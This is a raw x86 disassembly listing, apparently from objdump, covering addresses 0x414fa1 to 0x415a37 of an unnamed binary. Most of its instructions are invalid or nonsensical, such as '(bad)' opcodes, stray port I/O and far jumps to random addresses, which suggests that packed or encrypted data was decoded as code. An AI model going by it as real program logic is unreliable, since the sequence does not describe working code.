  414fa1:	push   0x8e8c7915
  414fa6:	(bad)  
  414fa8:	ror    BYTE PTR [esi+esi*2],cl
  414fab:	mov    DWORD PTR ds:0x2141c3b,esp
  414fb1:	xor    BYTE PTR [ebx+0x40],ah
  414fb4:	mov    eax,DWORD PTR [edi]
  414fb6:	or     al,cl
  414fb8:	scas   al,BYTE PTR es:[edi]
  414fb9:	pop    ebp
  414fba:	inc    ebp
  414fbb:	jle    0x414f86
  414fbd:	xlat   BYTE PTR ds:[ebx]
  414fbe:	sahf   
  414fbf:	mov    ss,WORD PTR [edx]
  414fc1:	clc    
  414fc2:	mov    bh,0x3b
  414fc4:	xchg   esp,eax
  414fc5:	push   es
  414fc6:	fs stc 
  414fc8:	xchg   DWORD PTR [edi+0x2ff8898e],esi
  414fce:	lea    ebx,[esi+0x7a283b88]
  414fd4:	mov    ebx,0x4f1253c5
  414fd9:	adc    dh,ah
  414fdb:	pusha  
  414fdc:	stos   DWORD PTR es:[edi],eax
  414fdd:	xor    DWORD PTR [eax+0x55],esp
  414fe0:	inc    esi
  414fe1:	mov    bh,0x7e
  414fe3:	jge    0x414f9e
  414fe5:	mov    edx,0xaa1f4b9d
  414fea:	in     eax,0xb5
  414fec:	in     al,0x2c
  414fee:	loopne 0x415051
  414ff0:	push   ecx
  414ff1:	xor    al,0xfb
  414ff3:	pop    ss
  414ff4:	or     esp,edi
  414ff6:	bound  esi,QWORD PTR [eax]
  414ff8:	loopne 0x415010
  414ffa:	dec    ebx
  414ffb:	xchg   ecx,eax
  414ffc:	xchg   ebp,eax
  414ffd:	lahf   
  414ffe:	ss retf 
  415000:	stos   DWORD PTR es:[edi],eax
  415001:	mov    ah,0xcc
  415003:	mov    ah,cl
  415005:	or     ecx,esp
  415007:	mov    dh,0x5e
  415009:	std    
  41500a:	mov    edi,DWORD PTR [edx]
  41500c:	mov    esp,0x47325c2a
  415011:	mov    BYTE PTR [edx+0x1f],dh
  415014:	loopne 0x415058
  415016:	mov    ecx,0x1daa936e
  41501b:	into   
  41501c:	jge    0x415098
  41501e:	test   al,0x8b
  415020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415021:	(bad)  
  415022:	repz fld QWORD PTR [ebp-0x2d]
  415026:	call   0x91c0e8dd
  41502b:	(bad)  
  41502c:	fcomp  QWORD PTR [edi+0x4d]
  41502f:	xor    BYTE PTR [ecx],bh
  415031:	dec    edx
  415032:	dec    edx
  415033:	iret   
  415034:	push   es
  415035:	jmp    0x2abfb3e5
  41503a:	shr    BYTE PTR [esi],cl
  41503c:	dec    esi
  41503d:	jbe    0x4150aa
  41503f:	cmp    eax,0x4af3dd18
  415044:	cmp    al,ch
  415046:	mov    dh,0x93
  415048:	mov    ecx,0xd1115bcd
  41504d:	sbb    eax,0x2e0cfffb
  415052:	imul   esp,DWORD PTR ds:[edi],0xee15f011
  415059:	lahf   
  41505a:	cmp    ebp,DWORD PTR [ecx+0x76]
  41505d:	fcomp  QWORD PTR [edi]
  41505f:	inc    edx
  415060:	jmp    0xc452e100
  415065:	xor    DWORD PTR [edx+0x62],edx
  415068:	out    dx,eax
  415069:	push   es
  41506a:	inc    edi
  41506b:	stos   DWORD PTR es:[edi],eax
  41506c:	das    
  41506d:	retf   
  41506e:	pop    es
  41506f:	outs   dx,DWORD PTR ds:[esi]
  415070:	dec    edx
  415071:	sar    BYTE PTR [ebx-0x5f],cl
  415074:	or     eax,0xaad4b5fb
  415079:	dec    esp
  41507a:	les    ebx,FWORD PTR [esi]
  41507c:	mov    ch,BYTE PTR [eax+0x31b3c464]
  415082:	ss push cs
  415084:	lock jb 0x41505d
  415087:	adc    dl,BYTE PTR [esi-0x6a]
  41508a:	push   edx
  41508b:	sahf   
  41508c:	jmp    0x3ecd98af
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x8d6cfc2d
  415102:	cmp    edi,DWORD PTR [eax+ebx*1-0x22]
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0xe2000001
  41510d:	pop    edi
  41510e:	push   esi
  41510f:	not    DWORD PTR [ebp-0x2e8e23fd]
  415115:	jg     0x4150cd
  415117:	xor    dl,ah
  415119:	cwde   
  41511a:	push   es
  41511b:	sbb    DWORD PTR [ecx+edx*4-0x1e],ebp
  41511f:	adc    eax,0xe59ef4d1
  415124:	adc    BYTE PTR [ebx],bh
  415126:	lock adc cl,BYTE PTR [ebp+0x7]
  41512a:	dec    ecx
  41512b:	dec    eax
  41512c:	jg     0x4150f7
  41512e:	jbe    0x41512a
  415130:	pop    es
  415131:	test   DWORD PTR [esi-0x8],eax
  415134:	lds    edx,FWORD PTR [ebx]
  415136:	scas   eax,DWORD PTR es:[edi]
  415137:	dec    ecx
  415138:	out    0xdd,eax
  41513a:	imul   esp,DWORD PTR [esi],0x7b80f16
  415140:	into   
  415141:	and    BYTE PTR [edi+0x4eb8200a],0x5e
  415148:	mov    BYTE PTR [esi+edi*2-0x28],bh
  41514c:	jne    0x415108
  41514e:	xchg   DWORD PTR [esi+edx*1-0x32],ebx
  415152:	cdq    
  415153:	sub    bl,ch
  415155:	mov    ecx,0x5f90adb7
  41515a:	ror    DWORD PTR ds:0x6c265a58,0x24
  415161:	adc    eax,0x85055b33
  415166:	mov    ebp,0x52ffccbf
  41516b:	lahf   
  41516c:	dec    ebx
  41516d:	or     cl,BYTE PTR ds:0xbcdbf019
  415173:	daa    
  415174:	jle    0x415113
  415176:	ja     0x415182
  415178:	int    0x3f
  41517a:	jmp    0x539d:0x81c71fdf
  415181:	mov    ch,0xc3
  415183:	lea    esp,[eax*8-0x601df961]
  41518a:	cwde   
  41518b:	xchg   edi,eax
  41518c:	push   0xd5cdca99
  415191:	inc    esi
  415192:	xchg   edx,eax
  415193:	mov    ebp,ecx
  415195:	inc    edx
  415196:	add    al,0x7f
  415198:	add    BYTE PTR [esi+esi*8-0x61],ah
  41519c:	inc    esi
  41519d:	and    dl,dl
  41519f:	dec    ecx
  4151a0:	hlt    
  4151a1:	jl     0x415136
  4151a3:	mov    ds:0xcb3e3699,al
  4151a8:	enter  0xafa8,0xc7
  4151ac:	gs cmp ah,al
  4151af:	jmp    0xf522:0xe4617f65
  4151b6:	loop   0x415138
  4151b8:	pusha  
  4151b9:	stos   BYTE PTR es:[edi],al
  4151ba:	or     DWORD PTR [edi+0x40b274cf],edi
  4151c0:	setnp  BYTE PTR [esi+0x76fc8029]
  4151c7:	repnz retf 
  4151c9:	adc    eax,0x2bd1991
  4151ce:	cmp    BYTE PTR [ebp+0x22],0x94
  4151d2:	adc    DWORD PTR [esi+0x63],edi
  4151d5:	adc    dh,BYTE PTR [esi-0x18]
  4151d8:	mul    DWORD PTR [ebx]
  4151da:	push   es
  4151db:	jmp    0xa41d17c
  4151e0:	mov    ebx,0x4bd4f148
  4151e5:	pusha  
  4151e6:	mov    ecx,0x5dad0444
  4151eb:	mov    eax,0x6269a820
  4151f0:	jnp    0x4151ca
  4151f2:	js     0x4151f8
  4151f4:	fiadd  DWORD PTR [esi]
  4151f6:	cmp    al,bh
  4151f8:	ret    
  4151f9:	pop    ebx
  4151fa:	rcl    BYTE PTR [ebx-0x58],1
  4151fd:	cmp    esi,DWORD PTR [ebx+0x7d]
  415200:	pop    edx
  415201:	push   edx
  415202:	test   al,0x20
  415204:	add    edi,DWORD PTR [esi]
  415206:	add    dl,BYTE PTR [ecx+eiz*8]
  415209:	pop    esp
  41520a:	cmp    eax,0xb157251e
  41520f:	ds mov edi,0x0
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x17d0660b
  415283:	adc    DWORD PTR ds:0x50000df,ebx
  415289:	add    DWORD PTR [eax],eax
  41528b:	add    BYTE PTR [edx+0x3e],bh
  41528e:	ret    0xa994
  415291:	(bad)  
  415292:	sti    
  415293:	or     BYTE PTR [ecx+edi*8],0xf2
  415297:	lahf   
  415298:	sbb    eax,0x45a50a5f
  41529d:	retf   
  41529e:	sub    DWORD PTR [edx],ebx
  4152a0:	stos   DWORD PTR es:[edi],eax
  4152a1:	shl    DWORD PTR [esi-0x75],cl
  4152a4:	(bad)  
  4152a5:	(bad)  [ebx-0x2ae2591f]
  4152ab:	jmp    0xf96b5214
  4152b0:	sbb    DWORD PTR [esi+edx*1-0x11],ebp
  4152b4:	fidivr WORD PTR [ecx-0xc]
  4152b7:	jp     0x41526e
  4152b9:	push   eax
  4152ba:	es inc ecx
  4152bc:	mov    WORD PTR [edi+0x38],gs
  4152bf:	mov    edx,?
  4152c1:	mov    ah,0xf0
  4152c3:	test   DWORD PTR [eax-0x20],eax
  4152c6:	and    al,0xf9
  4152c8:	mov    BYTE PTR ds:0xaf534fa3,al
  4152ce:	adc    edx,DWORD PTR [esi+0x29]
  4152d1:	and    ch,cl
  4152d3:	sub    al,0x5b
  4152d5:	push   ss
  4152d6:	inc    eax
  4152d7:	fbld   TBYTE PTR [ebp+0x10]
  4152da:	jns    0x4152fd
  4152dc:	pop    ds
  4152dd:	sub    cl,BYTE PTR [edi+eiz*1-0x2f990c75]
  4152e4:	gs push edx
  4152e6:	xor    DWORD PTR [edx],0x14aa5b63
  4152ec:	outs   dx,BYTE PTR ds:[esi]
  4152ed:	icebp  
  4152ee:	push   ss
  4152ef:	loop   0x415312
  4152f1:	sub    BYTE PTR ds:[eax+0x4fec3c9f],dh
  4152f8:	and    BYTE PTR [ebp+0x621306a1],dl
  4152fe:	inc    esp
  4152ff:	push   ss
  415300:	std    
  415301:	jmp    0xdeac:0x9a01d707
  415308:	mov    DWORD PTR [eax+ebx*1+0x58131d74],esi
  41530f:	pop    esp
  415310:	pop    esi
  415311:	pop    ebp
  415312:	addr16 daa 
  415314:	(bad)  
  415315:	mov    al,0x50
  415317:	mov    ds:0x5a43fa9f,eax
  41531c:	adc    eax,0x65c210ca
  415321:	jno    0x4152eb
  415323:	or     BYTE PTR [eax-0x14be946],bl
  415329:	dec    ebp
  41532a:	shl    bh,cl
  41532c:	jge    0x41533c
  41532e:	test   DWORD PTR [edi-0x317ba12c],ebx
  415334:	scas   eax,DWORD PTR es:[edi]
  415335:	lahf   
  415336:	xor    al,0x95
  415338:	out    0xbf,al
  41533a:	int    0xb9
  41533c:	repnz div BYTE PTR [edi+0x45812c26]
  415343:	lahf   
  415344:	loope  0x4152de
  415346:	mov    eax,0xc320ac99
  41534b:	adc    DWORD PTR ds:0xf0c2c166,esi
  415351:	shr    bl,0xbc
  415354:	icebp  
  415355:	(bad)  
  415356:	sbb    DWORD PTR [edi],eax
  415358:	and    BYTE PTR [ecx],ch
  41535a:	in     al,0xd2
  41535c:	scas   al,BYTE PTR es:[edi]
  41535d:	(bad)  
  41535e:	test   esi,0xa5d1778d
  415364:	int3   
  415365:	inc    eax
  415366:	test   BYTE PTR [ecx],dl
  415368:	out    0xc5,al
  41536a:	aad    0x41
  41536c:	sbb    BYTE PTR [ebx-0x15],0xff
  415370:	push   esi
  415371:	mov    dl,0xab
  415373:	mov    ch,0x27
  415375:	push   ecx
  415376:	scas   al,BYTE PTR es:[edi]
  415377:	dec    ebx
  415378:	dec    ebx
  415379:	addr16 jp 0x4153eb
  41537c:	enter  0xbfd9,0x72
  415380:	ins    BYTE PTR es:[edi],dx
  415381:	xor    DWORD PTR [ecx-0x14],ebp
  415384:	xor    edx,DWORD PTR [eax+0xeb5eba6]
  41538a:	test   DWORD PTR ds:0x9a72f24d,eax
  415390:	xchg   esi,eax
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x80d3e5b0
  415401:	adc    BYTE PTR [ebx+ebx*2+0xe022],bl
  415408:	add    eax,0x29000001
  41540d:	or     DWORD PTR [eax],eax
  41540f:	jnp    0x415398
  415411:	test   eax,0xe419f968
  415416:	and    bl,BYTE PTR [ebx]
  415418:	xchg   esi,eax
  415419:	push   es
  41541a:	pop    edx
  41541b:	cmp    BYTE PTR [ebx-0x78],bh
  41541e:	push   edi
  41541f:	pop    edx
  415420:	mov    ecx,0xe733ccf3
  415425:	mov    ecx,esi
  415427:	mov    ecx,0x20147ca5
  41542c:	mov    ebx,ebp
  41542e:	mov    ds:0x9be735bb,al
  415433:	sub    edx,ecx
  415435:	jbe    0x4154b1
  415437:	xor    ecx,DWORD PTR [edi]
  415439:	jo     0x4153f8
  41543b:	push   ecx
  41543c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41543d:	mov    edx,0xab037cfb
  415442:	fld    DWORD PTR [ecx+ebp*4+0x58]
  415446:	xor    ah,BYTE PTR [edi+ebp*2-0x4f]
  41544a:	iret   
  41544b:	push   edi
  41544c:	mov    dh,BYTE PTR [esi-0x6e79e1c6]
  415452:	push   edx
  415453:	test   DWORD PTR [edx],esp
  415455:	mov    bl,0x89
  415457:	out    dx,al
  415458:	jo     0x4153f9
  41545a:	jge    0x41541c
  41545c:	xchg   ecx,eax
  41545d:	mov    edx,0xe4ed5de0
  415462:	imul   edi,DWORD PTR [eax-0x67],0xcb224bae
  415469:	xor    BYTE PTR [esi-0x2],bl
  41546c:	push   ds
  41546d:	in     eax,0xb7
  41546f:	shl    BYTE PTR [esi+0x20114fc4],0xba
  415476:	mov    ebx,0x4d0c8800
  41547b:	fdivr  QWORD PTR [esi+0x4fe14a60]
  415481:	out    0xb1,eax
  415483:	jbe    0x41546e
  415485:	jns    0x4154bc
  415487:	in     al,dx
  415488:	and    edx,edi
  41548a:	shl    BYTE PTR [edx+0x703d3422],cl
  415490:	loop   0x41542f
  415492:	aad    0xaf
  415494:	mov    ds:0xea9500de,eax
  415499:	push   edx
  41549a:	leave  
  41549b:	ja     0x4154ef
  41549d:	pop    ds
  41549e:	in     al,0x1d
  4154a0:	(bad)  
  4154a1:	or     DWORD PTR [ecx-0x32c05703],ecx
  4154a7:	ret    0x1a48
  4154aa:	rcl    DWORD PTR [eax-0x539c7b06],0x26
  4154b1:	aas    
  4154b2:	mov    cl,0xb2
  4154b4:	daa    
  4154b5:	push   ebp
  4154b6:	inc    esi
  4154b7:	cli    
  4154b8:	loop   0x415474
  4154ba:	mov    BYTE PTR [edi+0x35],bl
  4154bd:	mul    DWORD PTR [ebx+0x55a18dbb]
  4154c3:	icebp  
  4154c4:	sbb    DWORD PTR [eax-0x48],eax
  4154c7:	or     BYTE PTR [edi+0x72a423a9],bl
  4154cd:	xchg   esi,eax
  4154ce:	pop    edx
  4154cf:	outs   dx,DWORD PTR ds:[esi]
  4154d0:	test   BYTE PTR [eax+0x4730716a],al
  4154d6:	sahf   
  4154d7:	pushf  
  4154d8:	fidivr WORD PTR [edi]
  4154da:	mov    dh,0x7d
  4154dc:	jl     0x41550c
  4154de:	ja     0x415531
  4154e0:	push   0x2cee1aca
  4154e5:	pop    es
  4154e6:	retf   0x58a3
  4154e9:	sub    al,0xbf
  4154eb:	and    ebp,0x48
  4154ee:	mov    eax,0x867592c2
  4154f3:	mov    cl,0xa7
  4154f5:	pop    ebx
  4154f6:	xchg   edi,eax
  4154f7:	dec    esi
  4154f8:	push   ebp
  4154f9:	pop    edx
  4154fa:	repnz sub dl,ch
  4154fd:	sub    al,0x75
  4154ff:	xchg   ebp,eax
  415500:	mov    edx,0x4dfff5c9
  415505:	adc    bh,BYTE PTR [ecx-0x5c]
  415508:	fcmovb st,st(5)
  41550a:	shl    BYTE PTR [ebp-0x79],1
  41550d:	push   0x6c
  41550f:	mov    edx,0x15
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155b2
  415581:	nop
  415582:	mov    al,0x92
  415584:	daa    
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0xa6000001,al
  41558d:	retf   0xf96a
  415590:	out    dx,eax
  415591:	mov    bh,0x9d
  415593:	adc    dh,al
  415595:	mov    eax,ds:0x3abf55cd
  41559a:	adc    ecx,DWORD PTR [esi-0x7a514881]
  4155a0:	pop    edi
  4155a1:	inc    ecx
  4155a2:	sbb    cl,BYTE PTR [esi]
  4155a4:	push   ecx
  4155a5:	pop    esi
  4155a6:	idiv   DWORD PTR [ebx]
  4155a8:	pop    edi
  4155a9:	test   DWORD PTR [ebx],0x90d9da52
  4155af:	push   esp
  4155b0:	xlat   BYTE PTR ds:[ebx]
  4155b1:	repnz sbb al,0x70
  4155b4:	jle    0x41556e
  4155b6:	mov    ebx,DWORD PTR [eax-0x422d3494]
  4155bc:	pop    ebp
  4155bd:	loopne 0x4155c5
  4155bf:	call   0x781d:0xcb960750
  4155c6:	lods   al,BYTE PTR ds:[esi]
  4155c7:	push   ebp
  4155c8:	mov    ecx,0x515cd3ca
  4155cd:	shr    BYTE PTR [ebx],0x8
  4155d0:	or     DWORD PTR [ebx],edi
  4155d2:	dec    ecx
  4155d3:	cmp    eax,0x168b8f42
  4155d8:	ret    0x1eeb
  4155db:	sub    BYTE PTR [ecx+0x660306f6],cl
  4155e1:	mov    ebp,0x1ff1c257
  4155e6:	bound  ecx,QWORD PTR [esi+0x50]
  4155e9:	and    eax,0x602d63b6
  4155ee:	cmp    eax,0x3470f992
  4155f3:	mov    edx,0xc51a46d6
  4155f8:	lds    edx,FWORD PTR [ecx-0x31]
  4155fb:	mov    bl,0x56
  4155fd:	lods   eax,DWORD PTR ds:[esi]
  4155fe:	les    edi,FWORD PTR [ebx+0x4025e7]
  415604:	int    0x20
  415606:	ss shl bh,0x51
  41560a:	xchg   esi,eax
  41560b:	pop    es
  41560c:	mov    edi,ebp
  41560e:	cli    
  41560f:	repnz iret 
  415611:	pop    ss
  415612:	add    bl,BYTE PTR [edx+0x1a]
  415615:	adc    BYTE PTR [edi+ebp*1+0x46c986cb],cl
  41561c:	mov    WORD PTR [ebx],es
  41561e:	out    dx,al
  41561f:	xchg   BYTE PTR [eax],dl
  415621:	or     DWORD PTR [esi-0x2d],edx
  415624:	cmp    bl,ah
  415626:	add    eax,0xf3c816f7
  41562b:	pop    ds
  41562c:	clc    
  41562d:	push   eax
  41562e:	enter  0xc97b,0x13
  415632:	cmc    
  415633:	cwde   
  415634:	xor    al,BYTE PTR [edi+0x4a]
  415637:	jl     0x41564e
  415639:	jns    0x4155cd
  41563b:	(bad)
  41563e:	cmp    BYTE PTR [edi*8-0x7e03f69b],cl
  415645:	mov    BYTE PTR gs:[ecx-0x3b8382b3],bl
  41564c:	pop    edx
  41564d:	inc    ecx
  41564e:	outs   dx,BYTE PTR ds:[esi]
  41564f:	sbb    BYTE PTR [ebx],cl
  415651:	xor    DWORD PTR [edi+0x58594341],ecx
  415657:	int    0x2d
  415659:	xor    esp,edi
  41565b:	sbb    BYTE PTR [eax+ebp*8-0x26],cl
  41565f:	(bad)  
  415660:	mov    ch,0xca
  415662:	mov    esi,0x5f2eaaad
  415667:	(bad)  
  415668:	(bad)  
  415669:	fs (bad) 
  41566b:	hlt    
  41566c:	fld    TBYTE PTR [ebp+0x502f43c]
  415672:	popa   
  415673:	icebp  
  415674:	add    eax,0xa0dfbd7e
  415679:	mov    ch,0x6b
  41567b:	sub    ebp,DWORD PTR [ebx-0x284a33be]
  415681:	icebp  
  415682:	aaa    
  415683:	push   eax
  415684:	into   
  415685:	retf   
  415686:	retf   0x6dc3
  415689:	adc    al,0xe6
  41568b:	out    0x3d,al
  41568d:	arpl   si,bp
  41568f:	xchg   ecx,eax
  415690:	cwde   
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	fisub  DWORD PTR [esi]
  415702:	xor    esp,DWORD PTR [edi]
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0x82000001
  41570d:	and    eax,DWORD PTR [edi+0x12]
  415710:	sbb    cl,bh
  415712:	sbb    DWORD PTR [ecx-0x2139d933],edx
  415718:	add    al,0xab
  41571a:	(bad)  
  41571b:	or     al,0xe6
  41571d:	iret   
  41571e:	cmp    DWORD PTR [edx-0x1f],edi
  415721:	push   ecx
  415722:	aaa    
  415723:	add    DWORD PTR [ebx-0x795f846b],esp
  415729:	ret    
  41572a:	iret   
  41572b:	and    edx,esp
  41572d:	mov    es,WORD PTR [ecx]
  41572f:	xor    dh,BYTE PTR [ebx]
  415731:	adc    DWORD PTR [edi-0x6d],0xffffffb3
  415735:	add    dl,BYTE PTR [ebx+0x4f807fd6]
  41573b:	(bad)  
  41573c:	enter  0xe4cc,0x25
  415740:	push   esi
  415741:	das    
  415742:	lds    eax,FWORD PTR [ebx]
  415744:	int    0xa3
  415746:	iret   
  415747:	sti    
  415748:	mov    esp,0xeaf3e454
  41574d:	push   ss
  41574e:	sbb    BYTE PTR [ebx+0x27],ch
  415751:	ins    DWORD PTR es:[edi],dx
  415752:	cmp    eax,0x3bb57b1
  415757:	sbb    esi,0xf2406608
  41575d:	(bad)  
  41575e:	sub    eax,0xf8c601e4
  415763:	mov    esi,0x6e20fa07
  415768:	add    DWORD PTR [edx-0x1a5434c9],esi
  41576e:	dec    edx
  41576f:	mov    ecx,DWORD PTR [eax-0x26500470]
  415775:	popa   
  415776:	and    dh,BYTE PTR [edi-0x10]
  415779:	pop    ss
  41577a:	in     eax,0x2b
  41577c:	cwde   
  41577d:	into   
  41577e:	pop    ecx
  41577f:	test   al,0xbd
  415781:	daa    
  415782:	aas    
  415783:	test   DWORD PTR [eax+0xe],esi
  415786:	popa   
  415787:	dec    BYTE PTR [esi-0x6212851c]
  41578d:	inc    ebx
  41578e:	inc    ebp
  41578f:	imul   ecx,DWORD PTR [ebx+0x3e885eb7],0xffffffc5
  415796:	pop    ebp
  415797:	sub    BYTE PTR [edi-0x24],ah
  41579a:	fs aam 0x62
  41579d:	out    dx,al
  41579e:	push   ebp
  41579f:	jns    0x415771
  4157a1:	sub    ah,BYTE PTR [ebp+0x6c]
  4157a4:	xchg   edi,eax
  4157a5:	push   eax
  4157a6:	inc    ebx
  4157a7:	ja     0x4157a9
  4157a9:	sar    BYTE PTR [eax-0x2a4c5aac],0x7a
  4157b0:	inc    ebx
  4157b1:	ror    DWORD PTR [ebp-0x70],1
  4157b4:	dec    ecx
  4157b5:	mov    fs,ecx
  4157b7:	mov    ds:0xddf07c50,eax
  4157bc:	rcl    DWORD PTR ds:0xaa6c95f6,0xea
  4157c3:	sub    DWORD PTR [eax],ebx
  4157c5:	xor    al,0xe5
  4157c7:	dec    edi
  4157c8:	xor    ebx,DWORD PTR [eax+0x25dcbecc]
  4157ce:	nop
  4157cf:	jo     0x415802
  4157d1:	in     al,dx
  4157d2:	dec    ebx
  4157d3:	loop   0x4157d6
  4157d5:	(bad)  
  4157d6:	stos   DWORD PTR es:[edi],eax
  4157d7:	imul   edi,DWORD PTR ds:[ebx-0x7d17fac0],0x7f
  4157df:	(bad)  
  4157e0:	xchg   ecx,eax
  4157e1:	lods   al,BYTE PTR ds:[esi]
  4157e2:	push   ss
  4157e3:	fcmovnbe st,st(2)
  4157e5:	mov    DWORD PTR [edi],esp
  4157e7:	mov    ch,BYTE PTR [edx-0x540526ee]
  4157ed:	adc    bh,BYTE PTR [ebx+ecx*8+0x15]
  4157f1:	stos   DWORD PTR es:[edi],eax
  4157f2:	and    esi,DWORD PTR [ebx+0x6af81fe6]
  4157f8:	xor    eax,0x6abdd762
  4157fd:	or     al,0xcf
  4157ff:	aas    
  415800:	push   ebx
  415801:	dec    ebx
  415802:	shr    bh,1
  415804:	pop    esi
  415805:	(bad)  
  415806:	mov    ds:0x58c24e6b,eax
  41580b:	fidivr WORD PTR [edi-0x28]
  41580e:	sar    dl,1
  415810:	std    
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rol    DWORD PTR [ebx+0x316f6d75],cl
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR ds:0x3d000001,al
  41588d:	and    DWORD PTR [eax],esi
  41588f:	inc    ebp
  415890:	stos   DWORD PTR es:[edi],eax
  415891:	xlat   BYTE PTR ds:[ebx]
  415892:	cdq    
  415893:	fldenv [edx]
  415895:	or     al,0xb1
  415897:	(bad)  
  415898:	stc    
  415899:	shl    BYTE PTR [ebp+0x281b80a],1
  41589f:	hlt    
  4158a0:	sub    dl,BYTE PTR [ebx-0x1e21114e]
  4158a6:	inc    esp
  4158a7:	jmp    0x7a84:0x91a0e713
  4158ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158af:	add    ebp,ebp
  4158b1:	cmc    
  4158b2:	xor    DWORD PTR [eax+0x3f89ea25],esp
  4158b8:	mov    DWORD PTR [ebp-0x581e767a],edi
  4158be:	fst    QWORD PTR [edi+0x11]
  4158c1:	push   edi
  4158c2:	bound  edx,QWORD PTR [ebx-0x6d8e5da2]
  4158c8:	jae    0x415852
  4158ca:	sub    esi,esi
  4158cc:	push   esp
  4158cd:	xor    esi,eax
  4158cf:	lods   al,BYTE PTR ds:[esi]
  4158d0:	outs   dx,BYTE PTR ds:[esi]
  4158d1:	or     al,0xd7
  4158d3:	inc    ebp
  4158d4:	add    al,0x28
  4158d6:	adc    eax,0x61b8db93
  4158db:	jmp    0x6945830
  4158e0:	pusha  
  4158e1:	je     0x4158c8
  4158e3:	inc    edi
  4158e4:	xor    eax,0xd884a7ba
  4158e9:	std    
  4158ea:	push   ebp
  4158eb:	mov    ah,0x17
  4158ed:	inc    edx
  4158ee:	imul   esi,DWORD PTR [edx-0x5fff6941],0xffffffdd
  4158f5:	fwait
  4158f6:	mov    edi,0x5682207e
  4158fb:	and    eax,0x17937f36
  415900:	stc    
  415901:	nop
  415902:	or     ch,BYTE PTR [ecx+0x3bf80cf3]
  415908:	arpl   WORD PTR [ebx+ebx*1-0x1c],si
  41590c:	mov    al,ds:0xa5b6d3d0
  415911:	xor    si,bp
  415914:	pusha  
  415915:	adc    edx,DWORD PTR [edx+ebx*1+0x62857f27]
  41591c:	outs   dx,DWORD PTR ds:[esi]
  41591d:	or     DWORD PTR [ecx+ebx*2],edx
  415920:	pop    esp
  415921:	xlat   BYTE PTR ds:[ebx]
  415922:	cld    
  415923:	jmp    0x2f4:0x856f7065
  41592a:	dec    ecx
  41592b:	cs inc ebp
  41592d:	push   ebp
  41592e:	es (bad) 
  415930:	aam    0xec
  415932:	iret   
  415933:	and    bl,ch
  415935:	stos   BYTE PTR es:[edi],al
  415936:	cmp    al,0x83
  415938:	aam    0x1c
  41593a:	addr16 mov al,fs:0xc12c
  41593f:	mov    bh,0xd5
  415941:	iret   
  415942:	imul   edx,DWORD PTR [ebx+0x63],0xffffffcf
  415946:	mov    eax,DWORD PTR [edx-0x30]
  415949:	pop    ebx
  41594a:	inc    eax
  41594b:	mov    bh,0xce
  41594d:	inc    eax
  41594e:	repnz cli 
  415950:	rep outs dx,DWORD PTR ds:[esi]
  415952:	in     eax,0xd3
  415954:	dec    ebp
  415955:	inc    ebp
  415956:	(bad)  
  415957:	test   esp,0x8ce3d946
  41595d:	inc    ebx
  41595e:	push   ecx
  41595f:	not    WORD PTR [esi+0x76]
  415963:	push   esi
  415964:	push   ss
  415965:	fidivr WORD PTR [edx+0x2e]
  415968:	fadd   st(1),st
  41596a:	add    al,0xab
  41596c:	sbb    DWORD PTR [edi-0x1a1989c0],eax
  415972:	push   edi
  415973:	popf   
  415974:	out    dx,al
  415975:	sub    ebp,DWORD PTR [edi+0x44]
  415978:	add    edi,ebp
  41597a:	jecxz  0x4159ac
  41597c:	aas    
  41597d:	je     0x415974
  41597f:	nop
  415980:	fimul  WORD PTR [eax+0x7d]
  415983:	(bad)  
  415984:	nop
  415985:	out    dx,al
  415986:	lods   al,BYTE PTR ds:[esi]
  415987:	pop    es
  415988:	add    DWORD PTR [eax],0xf3ba3815
  41598e:	jb     0x4159fb
  415990:	inc    esi
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	inc    ebx
  415a01:	xchg   BYTE PTR [edi+0xe43677],ah
  415a07:	add    BYTE PTR ds:0x7000001,al
  415a0d:	jns    0x4159be
  415a0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a10:	aaa    
  415a11:	cmp    DWORD PTR ds:0xba9e3050,ebx
  415a17:	cs xchg esp,eax
  415a19:	and    dl,dl
  415a1b:	int3   
  415a1c:	cmp    eax,esi
  415a1e:	sub    eax,0x883990fa
  415a23:	xchg   ebx,eax
  415a24:	and    DWORD PTR [edi],eax
  415a26:	sub    BYTE PTR [edi],bl
  415a28:	dec    eax
  415a29:	mov    ds:0x6c8113ca,eax
  415a2e:	dec    ebp
  415a2f:	(bad)  
  415a30:	(bad)  
  415a31:	test   BYTE PTR [eax],0xdf
  415a34:	push   edi
  415a35:	out    0x7e,al
  415a37:	ficom  DWORD PTR [esi]
